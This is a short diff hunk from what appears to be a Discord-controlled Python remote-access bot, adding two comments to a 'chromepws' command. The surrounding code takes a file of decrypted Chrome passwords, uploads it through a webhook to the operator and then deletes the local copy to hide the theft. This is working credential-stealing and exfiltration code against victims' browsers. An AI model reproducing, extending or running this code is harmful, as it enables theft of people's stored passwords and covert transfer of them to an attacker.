@@ -406,12 +406,14 @@ async def chromepws(ctx):
         except Exception as e:
             qwertyuiop = 1
         try:
+            #convert .cvs file in .txt file
             subprocess.getoutput('move decrypted_password.csv DecryptedPassword.txt')
             with open('DecryptedPassword.txt', 'rb') as f:
                 webhook.add_file(file=f.read(), filename='DecryptedPassword.txt')
             webhook.execute()
             subprocess.getoutput('if exist DecryptedPassword.txt del DecryptedPassword.txt/q')
         except:
+            #if not exist the .csv file doesn't send anything
             await ctx.send("Error 404")
 
 client.run(botoken)
